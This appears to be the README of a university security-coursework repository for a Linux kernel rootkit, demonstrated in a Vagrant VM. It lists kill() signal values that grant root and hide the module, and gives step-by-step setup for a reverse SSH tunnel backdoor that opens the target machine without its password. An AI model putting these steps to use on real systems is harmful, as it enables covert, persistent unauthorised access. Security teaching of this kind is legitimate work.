# S3CW
Repository for Systems and Software Security unit coursework

## Interacting with the Rootkit

Some commands are accessible by using the system call `kill(pid_t pid, int, sig)`. Running this call with the following `sig` values will use our overridden method:

| `sig` value | Result                                  |
| ----------- | --------------------------------------- |
| 32          | Gain root access                        |
| 33          | Hide the rootkit module from the list   |
| 34          | Unhide the rootkit module from the list |



## Building Instructions

### <u>Backdoor Configuration Instructions</u>
Some set up is needed on the computer you wish to use to access the comprimised machine remotely, and without the need for their password.

***Turn on SSH port forwarding***

For own computer connecting to rootkit back door:
1. Go to your router settings via a browser (address is typically 192.168.0.1, but your router should show somewhere how to get to the router configuration page).
2. Find your local ip address by using `ifconfig` then comparing the **inet** addresses until you find one that appears on your router settings site.
3. Using `ifconfig`, find your **subnet mask**, and **Default gateway** corresponding to the ip address you just found. Default gateway is typically your ip address with the last section being 1 (i.e. x.x.x.1, where 0 <= x <= 255)
3. We need to ensure our own pc has a static IP on the network to make sure port forwarding always works, and the ssh backdoor tunnel can always be made:

***Linux***
1. Go to **Settings**->**Network**
2. Click on the cog next to the network device that you use to connect to your router (Ethernet or Wifi)
3. Go to the **IPv4** tab, and in **IPv4 Method** select **Manual**. This will give us a static IP
4. Type in the **ip address**, **subnet mask** and **gateway** you found earlier. In the **DNS** field, we can use the Google Public DNS which has address `8.8.8.8`
5. Click **apply**

***Now we have a static IP set, we need to add port forwarding rule***
1. Goto your routers settings
2. Add a port forwarding rule (usually in security or firewall) for port 22 and your local static ip address


### <u>Configuration before installing rootkit</u>
1. You need to generate an ssh rsa keypair. To do this run `ssh-keygen` and hit the *enter* key every time you are prompted for input. If you already have `~/.ssh/id_rsa` and `~/.ssh/id_rsa.pub`, make sure that your user has read write access (can check this through `ls -l ~/.ssh`). If your user doesn't have access (i.e. it says `root` instead), then remove these current keys (may need to do `sudo rm...`) and then run `ssh-keygen` **without `sudo`**.
2. Make sure python is installed, and run `python backdoor_config.py` to set up file with your username, public ssh rsa key, and public ip address. This will be used by the rootkit to set up an ssh backdoor so you can connect to the infected machine. 
3. Move the `backdoor_config.txt` file into the `rootkit` folder.
4. ONLY MOVE THE **rootkit** FOLDER TO THE MACHINE YOU WANT TO INFECT


### <u>Booting Vagrant</u>
In order to showcase our rootkit, we will be using a Vagrant VM running Ubuntu 12.04. However, any Linux machine (VM or on *bare metal*) with an internet connection and running Ubunutu 12.04 will work. If you use a VM make sure in its network settings the adapter is of type **bridged adapter**. If asked which adapter to bridge too when booting vagrant, select the adapter you use to connect to the internet (can find this out using `ifconfig` and seing which one has your static ip address).
1. `vagrant up` in folder containing vagrant file
2. Move rootkit folder to 'guest' folder (in same directory as vagrant file is in)
3. `vagrant ssh` 

### <u>Clean Build Instructions Once in Vagrant</u>
1. ``` sudo apt-get install linux-headers-`uname -r` ``` **WE CAN AUTOMATE THIS STEP IN THE INIT FUNCTION OF ROOTKIT**
2. `cd /vagrant` to go to shared 'guest' folder
3. `make all`
4. `sudo insmod rootkit.ko`
5. Whilst rootkit module is being installed, you will be asked to enter your **home computer's** password once on first instalation. This is to transfer a public ssh key and to set up the backdoor into the target system, so please enter it when prompted to do so.

### <u>Using backdoor</u>
1. Whilst you have access to the system you are infecting, run the command `whoami` and make a note of the result that is produced. We will need this to ssh into the system
2. We have set up a reverse ssh tunnel, meaning that whenever our router sees we are sending a request to `localhost` on port `7000` it will divert this to port `22` of our infected system
3. To access the infected system, simply type the command `ssh targetUser@localhost -p 7000` and you will have access to their system without the need for their password

